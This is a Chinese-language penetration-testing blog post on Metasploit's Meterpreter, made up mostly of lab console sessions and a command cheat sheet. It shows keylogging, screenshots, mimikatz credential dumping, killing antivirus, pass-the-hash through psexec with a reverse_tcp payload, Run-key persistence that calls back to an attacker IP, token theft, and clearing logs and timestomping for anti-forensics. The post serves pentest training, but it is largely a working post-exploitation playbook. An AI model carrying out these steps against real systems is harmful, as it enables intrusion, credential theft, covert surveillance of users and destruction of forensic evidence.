<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><title>metasploit之meterpreter - Guko's Blog</title><meta name="description" content="Meterpreter是matasploit框架中的一个扩展模块，可以调用metasploit的一些功能，对目标系统进行更深入的渗透这些功能包括反追踪、纯内存工作模式、密码哈希获取、特权提升、跳板攻击等。0x01 基本命令截屏screenshot命令meterpreter的screenshot命令可"><link type="text/css" rel="stylesheet" href="/css/pure.css?v=0.0.1"><link type="text/css" rel="stylesheet" href="/css/style.css?v=0.0.1"><script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.0/jquery.min.js"></script></head></html><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">metasploit之meterpreter</h1><a id="logo" href="/.">Guko's Blog</a></div><div id="nav-menu"><div class="bitcron_nav"><div class="site_nav_wrap"><div class="site_nav"><span class="a_container"><a href="/." class="selected active current">首页</a></span><span class="a_container"><a href="/archives/">归档</a></span><span class="a_container"><a href="/about/">关于</a></span><span class="a_container"><a href="/atom.xml">订阅</a></span></div></div></div></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">metasploit之meterpreter</h1><div class="post-meta">2020-02-18<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" type="text/javascript"></script><span class="meta-space">  |  </span><span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span><span> 浏览</span></span></div><!--文章内容--><div class="post-content"><p>Meterpreter是matasploit框架中的一个扩展模块，可以调用metasploit的一些功能，对目标系统进行更深入的渗透<br>这些功能包括反追踪、纯内存工作模式、密码哈希获取、特权提升、跳板攻击等。</p>
<a id="more"></a>

<h3 id="0x01-基本命令"><a href="#0x01-基本命令" class="headerlink" title="0x01 基本命令"></a>0x01 基本命令</h3><h4 id="截屏screenshot命令"><a href="#截屏screenshot命令" class="headerlink" title="截屏screenshot命令"></a>截屏screenshot命令</h4><p>meterpreter的screenshot命令可以获取活动用户的桌面截屏并保存到对应的路径</p>
<pre><code>meterpreter &gt; screenshot 
Screenshot saved to: /root/tjteQinp.jpeg</code></pre><p>在根目录下看到<code>tjteQinp.jpeg</code>，然后打开查看到目标主机当前的屏幕<br><img src="/2020/02/18/metasploit之meterpreter/1.png" alt><br><img src="/2020/02/18/metasploit之meterpreter/2.png" alt></p>
<h4 id="sysyinfo"><a href="#sysyinfo" class="headerlink" title="sysyinfo"></a>sysyinfo</h4><p><code>sysyinfo</code>可以获取系统运行的平台</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN-LTME4DTVE8Q</span><br><span class="line">OS              : Windows 7 (Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : CONTOSO</span><br><span class="line">Logged On Users : 3</span><br><span class="line">Meterpreter     : x64/windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h4 id="uictl开关键盘-鼠标"><a href="#uictl开关键盘-鼠标" class="headerlink" title="uictl开关键盘/鼠标"></a>uictl开关键盘/鼠标</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br></pre></td></tr></table></figure>

<h3 id="0x02-获取键盘记录"><a href="#0x02-获取键盘记录" class="headerlink" title="0x02 获取键盘记录"></a>0x02 获取键盘记录</h3><p>在我们需要获取系统的密码哈希值，可以使用破解，也可以在远程主机上进行键盘记录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br></pre></td></tr></table></figure>

<p>使用<code>keyscan_start</code>命令开启键盘记录后，在目标主机上输入测试字段后你用<code>keyscan_dump</code>可以看到键盘记录所捕获的内容，最后使用<code>keyscan_stop</code>停止</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_dump </span><br><span class="line">Dumping captured keystrokes...</span><br><span class="line">&lt;CR&gt;</span><br><span class="line">&lt;CR&gt;</span><br><span class="line">&lt;CR&gt;</span><br><span class="line">hsaklhsajk&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;&lt;CR&gt;</span><br><span class="line">&lt;CR&gt;</span><br><span class="line">&lt;CR&gt;</span><br><span class="line">&lt;^H&gt;pentest&lt;CR&gt;</span><br><span class="line">&lt;CR&gt;</span><br><span class="line">hhhh</span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_stop </span><br><span class="line">Stopping the keystroke sniffer...</span><br></pre></td></tr></table></figure>

<h3 id="0x3-使用meterpreter获取密码哈希值"><a href="#0x3-使用meterpreter获取密码哈希值" class="headerlink" title="0x3 使用meterpreter获取密码哈希值"></a>0x3 使用meterpreter获取密码哈希值</h3><p>微软Windows系统存储哈希值的方式一般为LAN Mannager(LM)、NTLAN Manager(NTLM)或NTLAN Manager(NTLMv2)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/18/metasploit之meterpreter/5.png" alt></p>
<h3 id="0x04-使用meterpreter脚本"><a href="#0x04-使用meterpreter脚本" class="headerlink" title="0x04 使用meterpreter脚本"></a>0x04 使用meterpreter脚本</h3><p>meterpreter的扩展脚本可以在meterpreter终端中进行系统探测，通过<code>run 脚本名字</code>可以在meterpreter终端中运行扩展脚本</p>
<h4 id="开启VNC"><a href="#开启VNC" class="headerlink" title="开启VNC"></a>开启VNC</h4><p>通过命令<code>run vnc</code>在远程系统上安装VNC会话，这样就能得到目标主机桌面的VNC窗口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run vnc </span><br><span class="line">[*] Creating a VNC reverse tcp stager: LHOST=192.168.197.193 LPORT=4545</span><br><span class="line">[*] Running payload handler</span><br><span class="line">[*] VNC stager executable 73802 bytes long</span><br><span class="line">[*] Uploaded the VNC agent to C:\Users\PINGMA~1\AppData\Local\Temp\SCNdBekLs.exe (must be deleted manually)</span><br><span class="line">[*] Executing the VNC agent with endpoint 192.168.197.193:4545...</span><br><span class="line">meterpreter &gt; Connected to RFB server, using protocol version 3.8</span><br><span class="line">Enabling TightVNC protocol extensions</span><br><span class="line">No authentication needed</span><br><span class="line">Authentication successful</span><br><span class="line">Desktop name &quot;win-ltme4dtve8q&quot;</span><br><span class="line">VNC server default format:</span><br><span class="line">  32 bits per pixel.</span><br><span class="line">  Least significant byte first in each pixel.</span><br><span class="line">  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0</span><br><span class="line">Using default colormap which is TrueColor.  Pixel format:</span><br><span class="line">  32 bits per pixel.</span><br><span class="line">  Least significant byte first in each pixel.</span><br><span class="line">  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0</span><br><span class="line">Same machine: preferring raw encoding</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/18/metasploit之meterpreter/3.png" alt></p>
<h4 id="迁移进程"><a href="#迁移进程" class="headerlink" title="迁移进程"></a>迁移进程</h4><p>当我们进行测试的受，会对一些服务类漏洞进行利用，如果目标关闭来相关的服务比如说浏览器，那么meterpreter会话也会随之关闭，导致与目标系统的连接丢失<br>为来避免这个问题，我们需要用到后渗透攻击模块（也可以先<code>ps</code>查看PID迁移到指定的进程中去）将meterprerter会话迁移到内存空间中其他的稳定的、不会被关闭的服务进程中，以维持稳定的系统控制连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/migrate </span><br><span class="line"></span><br><span class="line">[*] Running module against WIN-LTME4DTVE8Q</span><br><span class="line">[*] Current server process: notepad.exe (2080)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 2320</span><br><span class="line">[+] Successfully migrated to process 2320</span><br></pre></td></tr></table></figure>

<p>我们也可以先<code>ps</code>查看目标主机运行的进程,然后通过手动指定迁移进程，我们这里选取<code>PID</code>为<code>2080</code>的进程，然后使用命令<code>migrate</code>,最后使用<code>getpid</code>可以看到进程的<code>PID</code>已经是<code>2080</code>了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/18/metasploit之meterpreter/4.png" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; migrate 2080</span><br><span class="line">[*] Migrating from 2320 to 2080...</span><br><span class="line">[*] Migration completed successfully.</span><br><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 2080</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h4 id="关闭检测软件"><a href="#关闭检测软件" class="headerlink" title="关闭检测软件"></a>关闭检测软件</h4><p>某些入侵检测软件会阻止某些攻击，在这种情况下，我们可以运行<code>run post/windows/manage/killav</code>扩展脚本来停止相关进程,这里没有检查到相关进程，未在有杀毒软件的情况下测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line">[*] No target processes were found.</span><br></pre></td></tr></table></figure>

<h4 id="获取系统信息"><a href="#获取系统信息" class="headerlink" title="获取系统信息"></a>获取系统信息</h4><p><code>scraper</code>脚本可以列举出目标系统的信</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run scraper </span><br><span class="line">[*] New session on 192.168.197.194:445...</span><br><span class="line">[*] Gathering basic system information...</span><br><span class="line">[*] Error dumping hashes: Rex::Post::Meterpreter::RequestError priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.</span><br><span class="line">[*] Obtaining the entire registry...</span><br><span class="line">[*]  Exporting HKCU</span><br><span class="line">[*]  Downloading HKCU (C:\Users\PINGMA~1\AppData\Local\Temp\rtvhDMDZ.reg)</span><br><span class="line">[*]  Cleaning HKCU</span><br><span class="line">[*]  Exporting HKLM</span><br><span class="line">[*]  Downloading HKLM (C:\Users\PINGMA~1\AppData\Local\Temp\yWWboFjx.reg)</span><br><span class="line">[*]  Cleaning HKLM</span><br><span class="line">[*]  Exporting HKCC</span><br><span class="line">[*]  Downloading HKCC (C:\Users\PINGMA~1\AppData\Local\Temp\JsaXxvyN.reg)</span><br><span class="line">[*]  Cleaning HKCC</span><br><span class="line">[*]  Exporting HKCR</span><br><span class="line">[*]  Downloading HKCR (C:\Users\PINGMA~1\AppData\Local\Temp\eYyqCxtz.reg)</span><br><span class="line">[*]  Cleaning HKCR</span><br><span class="line">[*]  Exporting HKU</span><br><span class="line">[*]  Downloading HKU (C:\Users\PINGMA~1\AppData\Local\Temp\mqCNkjmg.reg)</span><br><span class="line">[*]  Cleaning HKU</span><br><span class="line">[*] Completed processing on 192.168.197.194:445...</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在我们拿下一台目标主机后，如果这台目标主机是以受限用户账号登入的，将会被限制执行一些需要管理员权限的命令，这时需要对账户进行提权。</p>
<p>getsystem提权原理：</p>
<ul>
<li>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道</li>
<li>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接</li>
<li>③Windows服务已启动，导致与命名管道建立连接。</li>
<li>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为系统用户创建模拟令牌。然后用新收集的系统模拟令牌产生的cmd.exe，并且我们有一个SYSTEM特权进程</li>
</ul>
<h3 id="0x05-获取系统密码哈希值"><a href="#0x05-获取系统密码哈希值" class="headerlink" title="0x05 获取系统密码哈希值"></a>0x05 获取系统密码哈希值</h3><p>获取系统密码哈希值的副本可以帮助我们实施哈希值传递攻击，或是进行哈希值暴力破解还原明文密码，可以使用<code>run post/windows/gather/smart_hashdump</code>命令<br>从<code>SAM</code>导出密码哈希,主要执行时需要<code>SYSTEM</code>权限</p>
<p><img src="/2020/02/18/metasploit之meterpreter/8.png" alt></p>
<h4 id="PSExec哈希传递"><a href="#PSExec哈希传递" class="headerlink" title="PSExec哈希传递"></a>PSExec哈希传递</h4><p>在上一步中我们已经获取到用户哈希后，当我们不能短时间将明文密码破解出来，而这个时侯我们又想通过已经获取到的哈希值入侵更多的系统，可以利用<code>windows/smb/psexec</code>模块进行哈希传递攻击,注意这里有两点前提:①打开445端口smb服务；②打开admin $共享</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set LHOST 192.168.159.134</span><br><span class="line">msf &gt; set LPORT 443</span><br><span class="line">msf &gt; set RHOST 192.168.159.144</span><br><span class="line">msf &gt;set SMBUser Administrator</span><br><span class="line">msf &gt;set SMBPass aad3b4*****04ee:5b5f00*****c424c</span><br><span class="line">msf &gt;set SMBDomain  WORKGROUP   #域用户需要设置SMBDomain</span><br><span class="line">msf &gt;exploit</span><br></pre></td></tr></table></figure>

<h4 id="0x06-控制持久化"><a href="#0x06-控制持久化" class="headerlink" title="0x06 控制持久化"></a>0x06 控制持久化</h4><p>使用启动项启动（persisitence）会在在<code>C：\ Users *** \ AppData \ Local \ Temp \</code>目录下，上传一个<code>vbs</code>脚本在注册表<code>HKLM \ Software \ Microsoft \ Windows \ CurrentVersion \ Run \</code>加入启动启动项</p>
<p>在取得一个meterpreter shell的情况下使用命令<code>run persistence -X -i 5 -p 4444 -r [攻击机ip]``-X</code>指定启动的方式为开机自启动，<code>-i</code>反向连接的时间间隔(5s) <code>–r</code>指定攻击者的ip<br><img src="/2020/02/18/metasploit之meterpreter/6.png" alt></p>
<p>连接后门</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set LHOST 192.168.196.193</span><br><span class="line">msf &gt; set LPORT 4444</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure>

<p><img src="/2020/02/18/metasploit之meterpreter/7.png" alt></p>
<h3 id="将命令行shell升级为meterpreterses"><a href="#将命令行shell升级为meterpreterses" class="headerlink" title="将命令行shell升级为meterpreterses"></a>将命令行shell升级为meterpreterses</h3><p>Metasploit框架中的一个功能可以在系统被攻陷的时候使用<code>sessions -u</code>将命令行<code>shell</code>升级为<code>meterpreter</code>，演示如下</p>
<p><img src="/2020/02/18/metasploit之meterpreter/9.png" alt></p>
<p>我们先获取的<code>shell cmd/unix</code>基于命令行的shell，然后使用<code>sessions -u</code>命令并指定<code>Id</code>就将命令行<code>shell</code>升级为<code>meterpreter</code></p>
<h3 id="0x07-Meterpreter速查命令"><a href="#0x07-Meterpreter速查命令" class="headerlink" title="0x07 Meterpreter速查命令"></a>0x07 Meterpreter速查命令</h3><p><code>help</code>: 打开Meterpreter使用帮助</p>
<p><code>run scriptname</code>: 运行Meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名</p>
<p><code>sysinfo</code>: 列出受控主机的系统信息</p>
<p><code>ls</code>: 列出目标主机的文件和文件夹信息</p>
<p><code>ps</code>: 显示所有运行进程以及关联的用户账户</p>
<p><code>migrate PID</code>: 迁移到一个指定的进程ID(PID号可以通过ps命令从目标主机上获得)</p>
<p><code>use incognito</code>: 加载incognito功能（用来盗窃目标主机的令牌或是假冒用户）</p>
<p>l<code>ist_tokens -u</code>: 列出目标主机可用的令牌</p>
<p><code>list_tokens -g</code>: 列出目标主机用户组的可用令牌</p>
<p><code>impersonate_token DOMAIN_NAME\\USERNAME</code>: 假冒目标主机上的可用令牌</p>
<p><code>steal_token PID</code>: 盗窃给定进程的可用令牌并进行令牌假冒 </p>
<p><code>drop_token</code>: 停止假冒当前令牌</p>
<p><code>getsystem</code>: 通过各种攻击向量来提升到系统用户权限</p>
<p><code>shell</code>: 以所有可用令牌来运行一个交互的shell</p>
<p><code>execute -f cmd.exe -i</code>: 执行cmd.exe命令并进行交互</p>
<p><code>execute -f cmd.exe -i -t</code>: 以所有可用令牌来执行cmd命令</p>
<p><code>execute -f cmd.exe -i -H -t</code>: 以所有可用令牌来执行cmd命令并隐藏该进程</p>
<p><code>rev2self</code>: 回到控制目标主机的初始用户账户下</p>
<p><code>reg command</code>: 在目标主机注册表中进行交互，创建，删除、查询等操作</p>
<p><code>setdesktop number</code>: 切换到另一个用户界面（该功能基于哪些用户已登陆）</p>
<p><code>screenshot</code>: 对目标主机的屏幕进行截图</p>
<p><code>upload file</code>: 向目标主机上传文件</p>
<p><code>download file</code>: 从目标主机下载文件</p>
<p><code>keyscan_start</code>: 针对远程目标主机开启键盘记录功能</p>
<p><code>keyscan_dump</code>: 存储目标主机上捕获的键盘记录</p>
<p><code>keyscan_stop</code>: 停止针对目标主机的键盘记录</p>
<p><code>getprivs</code>: 尽可能多的获取目标主机上的特权</p>
<p><code>uictl enable keyboard/mouse</code>: 接管目标主机的键盘和鼠标</p>
<p><code>background</code>: 将你当前的Meterpreter shell转为后台执行</p>
<p><code>hashdump</code>: 到处目标主机中的口令哈希</p>
<p><code>use sniffer</code>: 加载嗅探模块</p>
<p><code>sniffer_interfaces</code>: 列出目标主机所有开放的网络接口</p>
<p><code>sniffer_dump interfaceID pcapname</code>: 在目标主机上启动嗅探</p>
<p><code>sniffer_start interfaceID packet-buffer</code>:在目标主机上针对特定范围的数据包缓冲区启动嗅探</p>
<p><code>suiffer_stats interfaceID</code>: 获取正在实施嗅探网络接口的统计数据</p>
<p><code>sniffer_stop interfaceID</code>: 停止嗅探</p>
<p><code>add_user username password -h ip</code>: 在远程目标主机上添加一个用户</p>
<p><code>add_group_user &quot;Domain Admins&quot; username -h ip</code>: 将用户添加到目标主机的域管理员组中</p>
<p><code>clearev</code>: 清楚目标主机上的日志记录</p>
<p><code>timestomp</code>: 修改文件属性，例如修改文件的创建事件（反取证调查）</p>
<p><code>reboot</code>: 重启目标主机</p>
<p><code>getpid</code>: 获取当前进程的pid </p>
<p><code>kill pid</code>: 杀死进程 </p>
<p><code>getuid</code>: 查看权限</p>
<p><code>getwd</code>: 查看当前工作目录</p>
<p><code>edit</code>: 编辑文件 </p>
<p><code>quit</code>: 退出会话 </p>
<p>参考连接</p>
<p><a href="https://paper.seebug.org/29/" target="_blank" rel="noopener">https://paper.seebug.org/29/</a></p>
<p><a href="https://www.cnblogs.com/backlion/p/9484950.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9484950.html</a></p>
</div><!--文章标签--><div class="tags"><a href="/tags/meterpreter/">meterpreter</a></div><!--评论--></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" id="search" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"> 分类</div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"> 标签</div><div class="tagcloud"><a href="/tags/metasploit/" style="font-size: 18px;">metasploit</a> <a href="/tags/代码执行/" style="font-size: 12px;">代码执行</a> <a href="/tags/远程代码执行/" style="font-size: 15px;">远程代码执行</a> <a href="/tags/Cobalt-Strike/" style="font-size: 12px;">Cobalt Strike</a> <a href="/tags/Ngrok/" style="font-size: 12px;">Ngrok</a> <a href="/tags/文件包含/" style="font-size: 12px;">文件包含</a> <a href="/tags/QCOW2/" style="font-size: 12px;">QCOW2</a> <a href="/tags/Vulnhub/" style="font-size: 12px;">Vulnhub</a> <a href="/tags/权限提升/" style="font-size: 12px;">权限提升</a> <a href="/tags/命令执行/" style="font-size: 12px;">命令执行</a> <a href="/tags/shell脚本/" style="font-size: 12px;">shell脚本</a> <a href="/tags/免杀/" style="font-size: 15px;">免杀</a> <a href="/tags/文件上传/" style="font-size: 12px;">文件上传</a> <a href="/tags/poc/" style="font-size: 12px;">poc</a> <a href="/tags/meterpreter/" style="font-size: 12px;">meterpreter</a> <a href="/tags/msfvenom/" style="font-size: 12px;">msfvenom</a> <a href="/tags/反序列化/" style="font-size: 12px;">反序列化</a></div></div><div class="widget"><div class="widget-title"> 最新文章</div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/03/12/免杀初探-msf自免杀/">免杀初探-msf自免杀</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/07/免杀初探/">免杀初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/06/利用msfvenom生成木马/">利用msfvenom生成木马</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/05/搭建域环境/">搭建域环境</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/03/Ngrok-MSF/">Ngrok&MSF</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/28/Virt-Manager制作并克隆QCOW2镜像/">Virt-Manager制作并克隆QCOW2镜像</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/24/Tomcat-Ajp漏洞复现-CVE-2020-1938/">Tomcat_Ajp漏洞复现(CVE-2020-1938)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/18/metasploit之meterpreter/">metasploit之meterpreter</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/14/Metasploit基本使用和控制台命令/">Metasploit基本使用和控制台命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/02/13/Metasploit信息收集/">Metasploit信息收集</a></li></ul></div><div class="widget"><div class="widget-title"> 友情链接</div><ul class="links-list"><li class="links-list-item"><a href="https://timeshu.github.io/" title="Time" target="_blank">Time</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a></li></ul></div></div></div></div><div id="footer">© <a href="/." rel="nofollow">Guko's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a> Theme<a target="_blank" href="https://github.com/7ye/maupassant-hexo"> Maupassant.</a></div><a id="back_to_top" href="javascript:void(0)" class="back_to_top"><span>△</span></a><script type="text/javascript" src="/js/totop.js?v=0.0.1"></script><link rel="stylesheet" href="/css/jquery.fancybox.css"><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1"></script><script>function auto_code_fit(){
  if($(".highlight").length != 0){
    var pc_width = $(".post-content").width();
    $(".highlight .code").find("pre").width((pc_width-70)+"px");
  }
}
window.onresize = function(){
  auto_code_fit();
}
auto_code_fit();</script></div></body>